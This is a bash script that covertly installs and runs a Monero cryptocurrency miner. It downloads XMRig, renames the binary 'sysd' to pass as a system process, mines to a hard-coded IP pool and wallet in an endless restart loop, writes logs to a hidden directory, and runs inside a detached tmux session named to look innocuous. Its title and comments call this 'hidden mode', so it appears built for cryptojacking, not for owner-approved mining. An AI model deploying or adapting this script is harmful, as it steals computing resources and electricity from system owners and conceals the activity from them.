#!/bin/bash
# ===============================
# Monero CPU Mining - Hidden Mode
# ===============================

SESSION_NAME="sysd"  # اسم tmux مخفي
XMRIG_VERSION="6.21.2"
WORKER="100"
POOL="45.155.102.89:443"
WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"
THREADS=  # عدد النوى

# مجلد السجلات
LOG_DIR="$HOME/.logs"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/sys.log"

# 1. Download XMRig if not exists
if [ ! -f xmrig-${XMRIG_VERSION}/xmrig ]; then
    wget -q https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz
    tar -xvf xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz >/dev/null
    mv xmrig-${XMRIG_VERSION}/xmrig xmrig-${XMRIG_VERSION}/sysd   # إعادة تسمية الملف التنفيذي
fi

# 2. Create auto-restart script
cat > xmrig-${XMRIG_VERSION}/start.sh << EOF
#!/bin/bash
cd "\$(dirname "\$0")"
while true
do
  ./sysd \\
    -o ${POOL} \\
    -u ${WALLET} \\
    -p x \\
    --tls \\
    --threads=${THREADS} \\
    --cpu-priority=5 >> "${LOG_FILE}" 2>&1
  
done
EOF
chmod +x xmrig-${XMRIG_VERSION}/start.sh

# 3. Kill old session if exists
# tmux kill-session -t ${SESSION_NAME} 2>/dev/null

# 4. Start hidden tmux session
tmux new -d -s ${SESSION_NAME} "cd xmrig-${XMRIG_VERSION} && ./start.sh"

echo "[OK] Mining started in hidden tmux session: ${SESSION_NAME}"
echo "[INFO] Log file: ${LOG_FILE}"
